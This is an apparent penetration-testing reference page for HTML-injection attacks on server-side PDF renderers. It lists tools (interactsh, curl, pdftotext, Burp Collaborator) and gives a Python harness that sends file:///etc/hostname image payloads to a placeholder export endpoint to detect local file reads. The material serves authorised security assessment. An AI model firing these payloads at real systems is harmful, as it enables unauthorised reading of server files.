# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`pdf-and-headless-renderer-injection`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `interactsh-client` | `interactsh-client -v` | Collect the renderer's callback with its originating address and engine User-Agent to prove server-side origin | Cross-platform |
| `curl` | `curl -sS -o out.pdf 'https://target.example/export?html=%3Cimg%20src%3Dfile%3A%2F%2F%2Fetc%2Fhostname%3E'` | Submit a file:// reference and retrieve the generated PDF for inspection | Cross-platform |
| `pdftotext` | `pdftotext out.pdf out.txt` | Extract embedded text from the produced PDF, then search out.txt for the hostname to confirm whether the local file was read | Linux, macOS |
| `Burp Collaborator` | `Insert a Collaborator URL as an img src and poll the Collaborator tab` | Same origin-proving oracle inside an intercepting proxy for blind cases | Cross-platform |

## Minimal Script Shape

A renderer differential harness: it submits one document referencing an assessor URL and one referencing a local file, retrieves both PDFs, and reports whether the local-file marker appears, indicating server-side local read.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/export"
MARKER = "hostname"

def render(html):
    url = BASE + "?" + urllib.parse.urlencode({"html": html})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read()

external = render('<img src="https://example.org/x.png">')
local = render('<img src="file:///etc/hostname">')
embedded = MARKER.encode() in local and MARKER.encode() not in external
print({"external_size": len(external), "local_size": len(local),
       "local_file_embedded": embedded,
       "verdict": "file-read" if embedded else "no-local-read"})
```
